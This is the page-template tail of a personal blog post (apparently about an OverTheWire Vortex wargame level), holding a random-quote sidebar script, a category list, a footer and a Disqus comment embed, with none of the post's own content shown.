  <p id="rquote_source"></p>
  <script text="javascript">
    var quotesObjs = [{"quote":"job = just over broke"},{"quote":"ISAF = I suck at fighting, I saw Americans fighting","source":"American troops in Afghanistan"},{"quote":"army = ain’t ready for Marines yet","source":"US Army"},{"quote":"Here’s to the crazy ones. The rebels. The troublemakers. The ones who see things differently. While some may see them as the crazy ones, we see genius. Because the people who are crazy enough to think they can change the world, are the ones who do.","source":"Apple's Think Different ad"},{"quote":"The cure for boredom is curiosity. There is no cure for curiosity.","source":"Dorothy Parker"},{"quote":"Unfettered by that, they proceeded to indulge themselves in sensual pleasures like sheep.","source":"Al-Ghazali, The Rescuer From Error"},{"quote":"More confusion – more nonsense, – and the nonsense, as usual, dangerous nonsense.","source":"Jeremy Bentham, Anarchical Fallacies"},{"quote":"Marriage is the grave of confidence and love.","source":"Olympe de Gouges in The Rights of Woman on the contemporary sad state of marriage"},{"quote":"Christian troops, we are told, are excellent. I deny this. Is someone going to show me some?","source":"Jean-Jacques Rousseau, On the Social Contract (Book IV, Ch VIII)"},{"quote":"Being powerful is like being a lady. If you have to tell people you are, you aren’t.","source":"Margaret Thatcher"},{"quote":"Weniger, aber besser (Less, but better)","source":"Dieter Rams"},{"quote":"There are two major products that came out of Berkeley: LSD and UNIX. We don't believe this to be a coincidence.","source":"Jeremy S. Anderson"},{"quote":"[Linux] is not some crazy drug-induced microkernel...","source":"Linus Torvalds, Linux Kernel Mailing List"},{"quote":"Good design is as little design as possible.","source":"Dieter Rams"},{"quote":"I don’t care to belong to any club that will have me as a member.","source":"Groucho Marx"},{"quote":"Part of the secret of a success in life is to eat what you like and let the food fight it out inside.","source":"Mark Twain"},{"quote":"Before you speak, ask yourself: Is it necessary? Is it true? Does it improve upon the silence?","source":"Shirdi Sai Baba"},{"quote":"It is not the critic who counts; not the man who points out how the strong man stumbles, or where the doer of deeds could have done them better. The credit belongs to the man who is actually in the arena, whose face is marred by dust and sweat and blood.","source":"Theodore Roosevelt"},{"quote":"Above all else, try something.","source":"Franklin Roosevelt"},{"quote":"If you are going through hell, keep going.","source":"Winston Churchill"},{"quote":"Workers work hard enough to not be fired, and owners pay just enough so that workers don't quit."},{"quote":"Bulls make money, and bears make money; but pigs get slaughtered.","source":"the Street"},{"quote":"Profits are made when something is bought; not when it is sold."},{"quote":"In this world nothing is certain but death and taxes.","source":"Benjamin Franklin"},{"quote":"The only difference between death and taxes is that on occasion death is relatively painless."},{"quote":"The only man never to be redeemed is the man without passion.","source":"Atlas Shrugged"},{"quote":"I believe a lecture should be like a woman's skirt. Long enough to cover the subject, short enough to keep it interesting.","source":"René Morel"},{"quote":"It is easy in the world to live after the world's opinion; it is easy in solitude to live after our own; but the great man is he who in the midst of the crowd keeps with perfect sweetness the independence of solitude.","source":"Ralph Waldo Emerson"},{"quote":"The happiness of those who want to be popular depends on others; the happiness of those who seek pleasure fluctuates with moods outside their control; but the happiness of the wise grows out of their own free acts.","source":"Marcus Aurelius"},{"quote":"The difference between raising boys and girls is that with boys, you have to worry about one penis. With girls, you have to worry about all the penises.","source":"Anonymous"},{"quote":"Some pretend to be rich, yet have nothing; others pretend to be poor, yet have great wealth.","source":"Proverbs 13:7"},{"quote":"I returned, and saw under the sun, that the race is not to the swift, nor the battle to the strong, neither bread to the wise, nor yet riches to men of understanding, nor yet favor to men of skill; but time and chance happeneth to them all.","source":"Ecclesiastes 9:11"},{"quote":"A banker is a fellow who lends you his umbrella when the sun is shining, but wants it back the minute it begins to rain.","source":"Mark Twain"},{"quote":"No group of professionals meets except to conspire against the public at large.","source":"Mark Twain"},{"quote":"If you simplify your English, you are freed from the worst follies of orthodoxy. Political language...is designed to make lies sound truthful and murder respectable, and to give an appearance of solidity to pure wind.","source":"George Orwell in Politics and the English Language"},{"quote":"Neither can his mind be thought to be in tune, whose words do jarre, nor his reason in frame, whose sentence is preposterous.","source":"Ben Jonson"},{"quote":"A lack of visual clarity in arranging evidence is a sign of lack of intellectual clarity in reasoning about evidence.","source":"Tufte in Visual Explanations"},{"quote":"For the love of money is the root of all evil: which while some coveted after, they have erred from the faith, and pierced themselves through with many sorrows.","source":"St. Paul in his First Letter to Timothy"}];
    quoteObj = quotesObjs[Math.floor(Math.random() * quotesObjs.length)];
    document.getElementById('rquote').innerHTML = quoteObj.quote;
    document.getElementById('rquote_source').innerHTML = quoteObj.source;
  </script>
</section>

<section>
  <h3>RSS Links</h3>
  <p><a href="/atom.xml">All posts</a></p>
</section>

<section class="last">
  <h3>Categories</h3>
  <ul id="categories">
    <li class='category'><a href='/categories/business/'>Business (9)</a></li>
<li class='category'><a href='/categories/career/'>Career (16)</a></li>
<li class='category'><a href='/categories/china/'>China (13)</a></li>
<li class='category'><a href='/categories/chinese-culture/'>Chinese Culture (12)</a></li>
<li class='category'><a href='/categories/columbia-university/'>Columbia University (27)</a></li>
<li class='category'><a href='/categories/computer-science/'>Computer Science (7)</a></li>
<li class='category'><a href='/categories/current-events/'>Current Events (43)</a></li>
<li class='category'><a href='/categories/design/'>Design (6)</a></li>
<li class='category'><a href='/categories/economy/'>Economy (11)</a></li>
<li class='category'><a href='/categories/electronics/'>Electronics (3)</a></li>
<li class='category'><a href='/categories/food-and-drink/'>Food & Drink (12)</a></li>
<li class='category'><a href='/categories/friends/'>Friends (15)</a></li>
<li class='category'><a href='/categories/information-security/'>Information Security (9)</a></li>
<li class='category'><a href='/categories/internet/'>Internet (28)</a></li>
<li class='category'><a href='/categories/journalism/'>Journalism (13)</a></li>
<li class='category'><a href='/categories/math/'>Math (10)</a></li>
<li class='category'><a href='/categories/nature-and-outdoors/'>Nature & Outdoors (12)</a></li>
<li class='category'><a href='/categories/new-york-city/'>New York City (17)</a></li>
<li class='category'><a href='/categories/personal/'>Personal (55)</a></li>
<li class='category'><a href='/categories/photography/'>Photography (3)</a></li>
<li class='category'><a href='/categories/programming-and-software/'>Programming & Software (52)</a></li>
<li class='category'><a href='/categories/spy-shit/'>Spy Shit (5)</a></li>
<li class='category'><a href='/categories/startups-and-entrepreneurism/'>Startups & Entrepreneurism (4)</a></li>
<li class='category'><a href='/categories/swimming/'>Swimming (2)</a></li>
<li class='category'><a href='/categories/technology/'>Technology (33)</a></li>
<li class='category'><a href='/categories/travel/'>Travel (28)</a></li>
<li class='category'><a href='/categories/tv-and-movies/'>Tv & Movies (20)</a></li>
<li class='category'><a href='/categories/uncategorized/'>Uncategorized (22)</a></li>
<li class='category'><a href='/categories/wellesley/'>Wellesley (6)</a></li>
<li class='category'><a href='/categories/woodworking/'>Woodworking (3)</a></li>
<li class='category'><a href='/categories/writing-and-literature/'>Writing & Literature (17)</a></li>

  </ul>
</section>

    
  </aside>
</div>


    </div>
    <footer class="page-footer" role="contentinfo"><script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="/javascripts/bootstrap.min.js"></script>
<script src="/javascripts/davidxia.min.js"></script>

<p class="copyright-info">
  https://www.davidxia.com and all contents copyright 2009-2020 by David Xia,
  unless otherwise noted. Contents under
  <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">Creative Commons License</a>
</p>

</footer>
    

<script type="text/javascript">
      var disqus_shortname = 'davidxia';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2/';
        var disqus_url = 'https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2/';
        var disqus_script = 'embed.min.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



  </div>
</body>
</html>
